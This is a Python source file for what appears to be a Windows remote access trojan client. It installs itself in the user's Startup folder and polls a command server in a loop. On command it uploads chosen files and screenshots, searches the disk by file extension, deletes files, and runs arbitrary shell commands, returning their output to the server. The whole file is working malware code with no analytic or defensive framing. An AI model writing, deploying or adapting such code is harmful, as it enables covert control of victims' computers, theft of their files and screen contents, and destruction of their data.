import requests
import subprocess 
import time
import os
from datetime import datetime
from win32com.client import Dispatch
import pyautogui
import tempfile
import shutil

save = tempfile.mkdtemp("screen")
SERVER_IP_ADDRESS = "http://127.0.0.1:5000/"
username = os.getlogin()
source = os.listdir()
destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)
cwd = os.getcwd()
response = ""

def main():
    path = os.path.join(destination, "Client.pyw - Shortcut.lnk")
    target = "" + cwd + r"\Client.pyw"
    icon = "" + cwd + r"\Client.pyw"
    for files in source:
        if files == "Client.pyw":
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(path)
            shortcut.Targetpath = target
            shortcut.IconLocation = icon
            shortcut.save()

shortcut = 'Client.pyw - Shortcut.lnk'
if shortcut in os.listdir(destination):
    pass
else:
    main()


while True:
    try:
        params = {"path": os.getcwd()}
        req = requests.get(SERVER_IP_ADDRESS, params)
        response = req.text
    except Exception as e:
        pass
    else:
        try:
            if 'terminate' == response.strip().lower():
                shutil.rmtree(save)
                break

            elif 'grab' in response and response.startswith('grab'):
                path = response[5:]

                if os.path.exists(path):
                    fileName = path.split("\\")[-1]
                    url = SERVER_IP_ADDRESS + '/store'
                    fo = open(path, 'rb')
                    files = {'file': fo}
                    r = requests.post(url, files = files)
                    fo.close()
                else:
                    post_response = requests.post(url = SERVER_IP_ADDRESS, data = '[-] Not able to find the file !')

            elif 'snapshot' == response.strip().lower():
                screenshot = pyautogui.screenshot()
                screenshot_name = r'\Screenshot_' + datetime.now().strftime('%d-%m-%Y_%H-%M-%S') + '.png'
                screenshot.save(save + screenshot_name)
                url = SERVER_IP_ADDRESS + '/store'
                fo = open(save + screenshot_name, 'rb')
                files = {'file': fo}
                r = requests.post(url, files = files)
                fo.close()
                
            elif 'search' in response and response.startswith('search'):
                response = response[7:]
                path, ext = response.split('*')
                list = ''
                for dirpath, dirname, files in os.walk(path):
                    for file in files:
                        if file.endswith(ext):
                            list = list + '\n' + os.path.join(dirpath, file)
                r = requests.post(SERVER_IP_ADDRESS, data = list)

            elif 'cd' in response and response.startswith('cd'):
                if len(response) == 2:
                    r = requests.post(SERVER_IP_ADDRESS, data = "Enter with Location")
                else:
                    directory = response[3:]
                    if directory == "Desktop":
                        os.chdir('C:\\Users\\' + username + '\\' + directory)
                    else:
                        os.chdir(directory)

            elif 'remove' in response and response.startswith('remove'):
                if len(response) == 6:
                    r = requests.post(SERVER_IP_ADDRESS, data = "Enter filename after remove")
                else:
                    filename = response[7:]
                    if os.path.exists(filename):
                        os.remove(filename)
                    else:
                        r = requests.post(SERVER_IP_ADDRESS, data= "The file does not exist")
            
            elif "dir" == response:
                list_of_files = "\n".join(os.listdir())
                r = requests.post(SERVER_IP_ADDRESS, data= list_of_files)

            else:
                CMD =  subprocess.Popen(response,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
                post_response = requests.post(url=SERVER_IP_ADDRESS, data=CMD.stdout.read()) 
                post_response = requests.post(url=SERVER_IP_ADDRESS, data=CMD.stderr.read())
        except Exception as e:
            pass

    time.sleep(1)
